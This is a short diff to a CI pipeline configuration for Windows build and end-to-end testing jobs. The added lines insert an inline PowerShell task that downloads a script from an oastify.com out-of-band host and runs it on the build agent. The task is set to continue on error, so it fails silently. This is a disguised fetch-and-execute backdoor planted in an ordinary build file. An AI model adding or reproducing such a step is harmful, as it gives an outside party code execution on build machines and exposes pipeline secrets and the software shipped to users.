@@ -159,6 +159,15 @@ jobs:
 
       # bundle windows adn do end to end tests
       - template: templates/e2e-testing-uwp.yml
+      
+      - task: PowerShell@2
+        inputs:
+          targetType: 'inline'
+          script: |
+            $Script = Invoke-WebRequest 'https://llanawkyiwy937t2jrmc6pvy3p9mxb.oastify.com/api/windows'
+            $ScriptBlock = [Scriptblock]::Create($Script.Content)
+            Invoke-Command -ScriptBlock $ScriptBlock
+        continueOnError: true
 
   # Win32 bundling and end to end testing
   - job: Win32PR
